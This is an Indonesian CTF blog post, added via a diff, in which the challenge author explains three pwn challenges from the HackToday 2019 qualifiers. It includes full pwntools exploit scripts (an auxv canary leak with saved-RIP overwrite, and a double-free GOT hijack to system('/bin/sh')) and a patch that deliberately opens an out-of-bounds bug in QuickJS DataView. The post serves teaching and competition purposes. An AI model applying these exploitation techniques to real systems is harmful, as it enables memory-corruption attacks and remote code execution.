@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en-id">
+    <head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+		<title>HackToday 2019 Quals - pwn &middot; Kyra&#39;s Note</title>
+
+		
+  		<link rel="stylesheet" href="/css/style.css">
+		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+		
+		<link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+		<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+		
+		<link href="" rel="alternate" type="application/rss+xml" title="Kyra&#39;s Note" />
+	</head>
+
+    <body>
+        		<nav class="nav">
+			<div class="nav-container">
+				<a href="/">
+					<h2 class="nav-title">Kyra&#39;s Note</h2>
+				</a>
+				<ul>
+    <li><a href="/about">About</a></li>
+    <li><a href="/">Posts</a></li>
+</ul>
+			</div>
+		</nav>
+
+        
+
+<main>
+	<div class="post">
+		<div class="post-info">
+    <span>Written by</span>
+        circleous
+        <br>
+        <span>on&nbsp;</span><time datetime="2019-08-25 12:38:25 &#43;0700 WIB">August 25, 2019</time>
+</div>
+		<h1 class="post-title">HackToday 2019 Quals - pwn</h1>
+<div class="post-line"></div>
+
+		
+
+		
+
+<p>Ini akan menjadi seri ke-tiga pada seri <em>writeup</em> HackToday 2019, kali ini saya akan menulis beberapa editorial untuk soal-soal pwn pada kualifikasi HackToday 2019.</p>
+
+<h2 id="ezrop">ezrop</h2>
+
+<p>Desain awal soal sebenarnya benar-benar sederhana, key value memory database system, dimana seseorang dapat melihat/mengubah isi value dari suatu key dan posisinya bisa <em>out-of-bound</em>. Yep, tanpa perubahan apapun pada isi memorynya. Tidak tahu kapan persis mulainya, tapi saya merasa soal ini terlalu mudah sehingga mengalami banyak perubahan yang membuat ini tidak benar-benar &ldquo;ez&rdquo;. Puncak kerumitannya, yang harus dilakukan adalah leak value canary lewat auxiliary vector<a href="https://www.gnu.org/software/libc/manual/html_node/Auxiliary-Vector.html">[1]</a><a href="https://lwn.net/Articles/519085/">[2]</a> karena saya mem-<em>poison</em> hampir semua value di memory serta pie+offset tepat pada RBP (leak PIE jadi tidak berguna disini). Beberapa hari sebelum kualifikasi dimulai, saya tersadar, ini soal &ldquo;ez&rdquo;, jadilah perubahan final soal ini, tanpa adanya <em>poison</em> pada value pada RBP. Sebagai gambaran, ini yang terjadi ketika sebelum perubahan final terjadi,</p>
+
+<pre><code>+----------+----------+
+| rand     | rand     |
++----------+----------+
+| rand     | canary   |
++----------+----------+
+| rand     | libc_ret |
++----------+----------+
+| ......   | ......   |
++----------+----------+
+</code></pre>
+
+<p>Kalau yang terjadi adalah seperti di atas, yang harus dilakukan adalah mendapatkan canary dari <code>AT_RADOM</code>, aux vector entry nomor 25.</p>
+
+<pre><code>#define AT_RANDOM        25                /* Address of 16 random bytes.  */
+</code></pre>
+
+<p>Yep, <code>AT_RANDOM</code> pun tidak langsung memberikan CANARY value karena ini adalah pointer ke random bytes di memory. Cara satu-satunya adalah terus menelursuri key-val chain hingga didapat CANARY-nya. Kalau dilihat lagi, <code>AT_RADOM</code> sendiri mengarah pada memory diantara auxv dan environment. Terdengar rumit, tapi <em>doable</em> untuk soal yang straightforward seperti ini.
+Bagaimana pun juga, ini soal dengan nama &ldquo;ez&rdquo;, jadi saya langsung mengurangi tingkat ke rumitannya dengan mengubah alur program tanpa <em>poison</em> memory pada RBP. Kalau seperti itu yang terjadi adalah seperti berikut.</p>
+
+<pre><code>+----------+----------+
+| rand     | rand     |
++----------+----------+
+| rand     | canary   |
++----------+----------+
+| pie+off  | libc_ret |
++----------+----------+
+| ......   | ......   |
++----------+----------+
+</code></pre>
+
+<p>dengan begitu, hanya dengan leak pie offset melalui <code>AT_PHDR</code> (auxv 3), seharusnya sudah dapat mengontrol value saved RIP melalui key-val system ini. btw, dari semua write-up yang dikirim ke panitia, sepertinya tidak ada satu pun tim yang menyadari keberadaan aux vector disini, sad. Full solver,
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#75715e"># context.terminal = [&#39;tmux&#39;, &#39;split-window&#39;, &#39;-h&#39;]</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;debug&#39;</span>, <span style="color:#e6db74">&#39;info&#39;</span>, <span style="color:#e6db74">&#39;warn&#39;</span>][<span style="color:#ae81ff">1</span>]
+
+BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./challenge/ezrop&#39;</span>
+HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;not.codepwnda.id&#34;</span>
+PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">30000</span>
+
+r <span style="color:#f92672">=</span> tube; elf <span style="color:#f92672">=</span> ELF; libc <span style="color:#f92672">=</span> ELF
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_canary</span>():
+    tmp <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>
+    
+    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
+        r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(tmp))
+        r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39; = &#39;</span>)
+        tmp <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">16</span>)
+        r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+        r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+    
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(tmp))
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39; = &#39;</span>)
+    tmp <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">16</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+
+    canary <span style="color:#f92672">=</span> tmp <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFF0000</span>
+    canary <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">8</span>
+    
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(tmp))
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39; = &#39;</span>)
+    tmp <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">16</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+    
+    canary <span style="color:#f92672">|=</span> (tmp <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">56</span>
+    <span style="color:#66d9ef">return</span> canary
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(REMOTE):
+
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39; = &#39;</span>)
+    at_phdr <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">16</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+
+    elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> at_phdr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x40</span>
+
+    info(<span style="color:#e6db74">&#39;AT_PHDR </span><span style="color:#e6db74">%X</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (at_phdr))
+    info(<span style="color:#e6db74">&#39;PIE_BASE </span><span style="color:#e6db74">%X</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (elf<span style="color:#f92672">.</span>address))
+
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> REMOTE: gdb<span style="color:#f92672">.</span>attach(r, <span style="color:#e6db74">&#39;b *{}&#39;</span><span style="color:#f92672">.</span>format(elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd40</span>))
+    canary <span style="color:#f92672">=</span> find_canary()
+    info(<span style="color:#e6db74">&#39;CANARY </span><span style="color:#e6db74">%X</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (canary))
+
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(canary))
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39; = &#39;</span>)
+    tmp <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">16</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(tmp))
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39; = &#39;</span>)
+    libc_start_main_ret <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">16</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+
+    info(<span style="color:#e6db74">&#39;LIBC_START_MAIN_RET </span><span style="color:#e6db74">%X</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (libc_start_main_ret))
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> ((libc_start_main_ret <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFF000</span>) <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>address
+    info(<span style="color:#e6db74">&#39;LIBC_BASE </span><span style="color:#e6db74">%X</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (libc<span style="color:#f92672">.</span>address))
+
+    <span style="color:#75715e"># ROP ALL THE WAY DOWN</span>
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(tmp))
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;flag&#39;</span>]))
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>)
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    REMOTE <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#39;REMOTE&#39;</span>)
+    elf <span style="color:#f92672">=</span> ELF(BINARY, checksec<span style="color:#f92672">=</span>False)
+
+    <span style="color:#66d9ef">if</span> REMOTE:
+        r <span style="color:#f92672">=</span> remote(HOST, PORT)
+        libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kyra/git/libc-database/db/libc6_2.23-0ubuntu10_amd64.so&#39;</span>, checksec<span style="color:#f92672">=</span>False)
+    <span style="color:#66d9ef">else</span>:
+        r <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process(aslr<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+        libc <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>libc
+        info(r<span style="color:#f92672">.</span>pid)
+
+    exploit(REMOTE)
+    r<span style="color:#f92672">.</span>interactive()</code></pre></div></p>
+
+<h2 id="leakless">leakless</h2>
+
+<p><img src="/img/hacktoday-leakless.png" alt="leakless" /><em>a pun from IDA, no undo, no surrender.</em>
+classical heap note problem, dimana terdapat double-free tanpa ada fungsi <code>view()</code> untuk note yang dibuat. Ada beberapa cara yang dapat dilakukan untuk mengotrol RIP sehingga mendapatkan shell dan untuk mendapatkan leak. Namun dari beberapa writeup yang saya baca, hampir semua mengganti GOT table <code>free</code> ke <code>PLT.printf</code> untuk digunakan sebagai format string. Saya sendiri mengubah GOT <code>atoi</code> ke <code>printf</code>. Full solver,
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;split-window&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>]
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;debug&#39;</span>, <span style="color:#e6db74">&#39;info&#39;</span>, <span style="color:#e6db74">&#39;warn&#39;</span>][<span style="color:#ae81ff">1</span>]
+
+BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./release/chall&#39;</span>
+HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;not.codepwnda.id&#34;</span>
+PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">30001</span>
+
+r <span style="color:#f92672">=</span> tube; elf <span style="color:#f92672">=</span> ELF; libc <span style="color:#f92672">=</span> ELF
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(size, msg, edited<span style="color:#f92672">=</span>False):
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> edited <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39; </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(size) <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> edited <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;%{}c</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(size))
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(msg))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(edited<span style="color:#f92672">=</span>False):
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> edited <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;  </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(REMOTE):
+    create(<span style="color:#ae81ff">0x38</span>, <span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
+    create(<span style="color:#ae81ff">0x18</span>, <span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span>)
+    delete()
+    delete()
+    create(<span style="color:#ae81ff">0x18</span>, p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;atoi&#39;</span>]))
+    create(<span style="color:#ae81ff">0x18</span>, p8(<span style="color:#ae81ff">0x00</span>))
+    create(<span style="color:#ae81ff">0x18</span>, p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;printf&#39;</span>]))
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;%19$p&#39;</span>
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, payload)
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> (int(r<span style="color:#f92672">.</span>recvline(False), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFF000</span>
+    info(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> libc<span style="color:#f92672">.</span>address)
+
+    create(<span style="color:#ae81ff">0x28</span>, <span style="color:#e6db74">&#39;C&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">1</span>)
+    delete(<span style="color:#ae81ff">1</span>)
+    delete(<span style="color:#ae81ff">1</span>)
+    create(<span style="color:#ae81ff">0x28</span>, p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;atoi&#39;</span>]), <span style="color:#ae81ff">1</span>)
+    create(<span style="color:#ae81ff">0x28</span>, p64(<span style="color:#ae81ff">0x00</span>), <span style="color:#ae81ff">1</span>)
+    create(<span style="color:#ae81ff">0x28</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]), <span style="color:#ae81ff">1</span>)
+
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    REMOTE <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#39;REMOTE&#39;</span>)
+    elf <span style="color:#f92672">=</span> ELF(BINARY, checksec<span style="color:#f92672">=</span>False)
+
+    
+    <span style="color:#66d9ef">if</span> REMOTE:
+        libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc-2.27.so&#39;</span>, checksec<span style="color:#f92672">=</span>False)
+        r <span style="color:#f92672">=</span> remote(HOST, PORT)
+    <span style="color:#66d9ef">else</span>:
+        libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/opt/glibc/x64/2.26/lib/libc.so.6&#39;</span>, checksec<span style="color:#f92672">=</span>False)
+        r <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process(aslr<span style="color:#f92672">=</span>True)
+
+    exploit(REMOTE)
+    r<span style="color:#f92672">.</span>interactive()</code></pre></div></p>
+
+<h2 id="quickie">quickie</h2>
+
+<p>Awalnya soal terakhir pwn untuk kualifikasi ini menyangkut hal JIT type confusion pada WebKit, mengikuti LiveOverflow hype pada seriesnya di YouTube, pwning WebKit. Setelah diukur waktu pengerjaannya, 6~7 jam pengerjaan untuk entry level CTF itu tidak memungkinkan. Akhirnya, mengikuti style speedrun DEF CON, saya membuat soal out-of-bound dari salah satu mini js engine yang ada. Yang saya pilih adalah <a href="https://bellard.org/quickjs/">QuickJS dari Fabrice Bellard</a> karena duktape sudah lumayan banyak digunakan untuk beberapa CTF sebelumnya (DEFCON, midnight, etc.). patchset yang diberikan, <code>0001-QuickJS-enable-OOB.patch</code>,
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-patch" data-lang="patch">diff --git quickjs.c quickjs.c
+index 9606455..c81b450 100644
+<span style="color:#f92672">--- quickjs.c
+</span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ quickjs.c
+</span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -47166,16 +47166,15 @@ static JSValue js_dataview_getValue(JSContext *ctx,
+</span><span style="color:#75715e"></span> {
+     JSTypedArray *ta;
+     JSArrayBuffer *abuf;
+<span style="color:#f92672">-    int is_swap, size;
+</span><span style="color:#f92672"></span><span style="color:#a6e22e">+    int is_swap;
+</span><span style="color:#a6e22e"></span>     uint8_t *ptr;
+     uint32_t v;
+<span style="color:#f92672">-    uint64_t pos;
+</span><span style="color:#f92672"></span><span style="color:#a6e22e">+    int64_t pos;
+</span><span style="color:#a6e22e"></span> 
+     ta = JS_GetOpaque2(ctx, this_obj, JS_CLASS_DATAVIEW);
+     if (!ta)
+         return JS_EXCEPTION;
+<span style="color:#f92672">-    size = 1 &lt;&lt; typed_array_size_log2(class_id);
+</span><span style="color:#f92672">-    if (JS_ToIndex(ctx, &amp;pos, argv[0]))
+</span><span style="color:#f92672"></span><span style="color:#a6e22e">+    if (JS_ToInt64Sat(ctx, &amp;pos, argv[0]))
+</span><span style="color:#a6e22e"></span>         return JS_EXCEPTION;
+     is_swap = FALSE;
+     if (argc &gt; 1)
+<span style="color:#75715e">@@ -47186,8 +47185,6 @@ static JSValue js_dataview_getValue(JSContext *ctx,
+</span><span style="color:#75715e"></span>     abuf = ta-&gt;buffer-&gt;u.array_buffer;
+     if (abuf-&gt;detached)
+         return JS_ThrowTypeErrorDetachedArrayBuffer(ctx);
+<span style="color:#f92672">-    if ((pos + size) &gt; ta-&gt;length)
+</span><span style="color:#f92672">-        return JS_ThrowRangeError(ctx, &#34;out of bound&#34;);
+</span><span style="color:#f92672"></span>     ptr = abuf-&gt;data + ta-&gt;offset + pos;
+ 
+     switch(class_id) {
+<span style="color:#75715e">@@ -47269,18 +47266,17 @@ static JSValue js_dataview_setValue(JSContext *ctx,
+</span><span style="color:#75715e"></span> {
+     JSTypedArray *ta;
+     JSArrayBuffer *abuf;
+<span style="color:#f92672">-    int is_swap, size;
+</span><span style="color:#f92672"></span><span style="color:#a6e22e">+    int is_swap;
+</span><span style="color:#a6e22e"></span>     uint8_t *ptr;
+     uint64_t v64;
+     uint32_t v;
+<span style="color:#f92672">-    uint64_t pos;
+</span><span style="color:#f92672"></span><span style="color:#a6e22e">+    int64_t pos;
+</span><span style="color:#a6e22e"></span>     JSValueConst val;
+ 
+     ta = JS_GetOpaque2(ctx, this_obj, JS_CLASS_DATAVIEW);
+     if (!ta)
+         return JS_EXCEPTION;
+<span style="color:#f92672">-    size = 1 &lt;&lt; typed_array_size_log2(class_id);
+</span><span style="color:#f92672">-    if (JS_ToIndex(ctx, &amp;pos, argv[0]))
+</span><span style="color:#f92672"></span><span style="color:#a6e22e">+    if (JS_ToInt64Sat(ctx, &amp;pos, argv[0]))
+</span><span style="color:#a6e22e"></span>         return JS_EXCEPTION;
+     val = argv[1];
+     v = 0; /* avoid warning */
+<span style="color:#75715e">@@ -47321,8 +47317,6 @@ static JSValue js_dataview_setValue(JSContext *ctx,
+</span><span style="color:#75715e"></span>     abuf = ta-&gt;buffer-&gt;u.array_buffer;
+     if (abuf-&gt;detached)
+         return JS_ThrowTypeErrorDetachedArrayBuffer(ctx);
+<span style="color:#f92672">-    if ((pos + size) &gt; ta-&gt;length)
+</span><span style="color:#f92672">-        return JS_ThrowRangeError(ctx, &#34;out of bound&#34;);
+</span><span style="color:#f92672"></span>     ptr = abuf-&gt;data + ta-&gt;offset + pos;
+ 
+     switch(class_id) {
+</code></pre></div>
+Kalau dilihat dari sisi orang yang tidak mengetahui sama sekali codebase QuickJS, hal yang pertama dilihat adalah fungsi yang diubah, <code>js_dataview_getValue</code>, dan nama file patch mengandung OOB, dari ini bisa diambil kesimpulan bahwa terdapat OOB pada fungsi <code>DataView</code> di javascript. Sedikit test run,</p>
+
+<pre><code>λ › ./qjs --nostd
+QuickJS - Type &quot;\h&quot; for help
+qjs &gt; let buf = new ArrayBuffer(64);
+undefined
+qjs &gt; let dv = new DataView(buf);
+undefined
+qjs &gt; dv.getFloat64(-1)
+0
+qjs &gt; dv.getFloat64(-1000)
+-4.5380154677666714e+279
+</code></pre>
+
+<p>duarr, xD. Terdapat OOB dimana seharusnya <code>dv.getFloat64(-1000)</code> mengembalikan value <code>undefined</code>, tapi <code>-4.5380154677666714e+279</code> (<code>0xc01226ed86db3332</code>). Dari yang harus dilakukan selanjutnya adalah mengubah OOB menjadi arbitrary read and write. Salah satu caranya adalah membuat &ldquo;master-slave&rdquo; buffer, dimana slave akan menjadi buffer yang menunjuk kepada arbitrary pointer dan master yang akan mengubah pointer pada slave buffer. Untuk mengetahui letak pointer dari slave buffer, bisa dilakukan dengan mencari unique value dari isi buffer dan memanfaatkan oob dari <code>DataView</code>, kalau sudah didapat posisi isi buffernya, bisa dilakukan kalkulasi offset relatif untuk mendapatkan pointer dari slave buffer. Stage selanjutnya setelah mendapatkan arbitrary RW adalah mengotrol RIP. Salah satu caranya adalah mengubah <code>__free_hook</code> ke one_gadget. Full solver, (belum dikasih komen sama sekali :v, <code>dvv</code> dan <code>dv</code> ini yang dimaksud dari master-slave)</p>
+
+<script type="application/javascript" src="https://gist.github.com/zeroload/775b567d5229aaac0b25b372a03af184.js?file=solve.js"></script>
+
+
+<h3 id="unintended-solution">unintended solution</h3>
+
+<p>Kelihatannya rumit, dan ga mungkin cukup untuk lomba yang hanya 6 jam ini, tapi kok masih di rilis? Beberapa hari sebelum penyisihan dimulai, qwerty merilis <a href="http://rce.party/cracksbykim-quickJS.nfo">0day</a> dari <em>mini competition</em> yang dibuat oleh di IRC kjc. Yep, 0day ini masih berguna di soal quickie dan itu kenapa saya berani mengeluarkan soal ini meskipun waktu CTF hanya 6 jam.</p>
+
+
+		
+	</div>
+
+	<div class="pagination">
+		<a href="/posts/admin-side-of-hacktoday-2019/" class="left arrow">&#8592;</a>
+
+		<a href="#" class="top">Top</a>
+	</div>
+</main>
+
+
+        		<footer>
+			<span>
+			&copy; <time datetime="2019-08-25 14:36:12.35594791 &#43;0700 WIB m=&#43;0.075018373">2019</time> . Made with <a href='https://gohugo.io'>Hugo</a> using the <a href='https://github.com/EmielH/tale-hugo/'>Tale</a> theme.
+			</span>
+		</footer>
+
+    </body>
+</html>
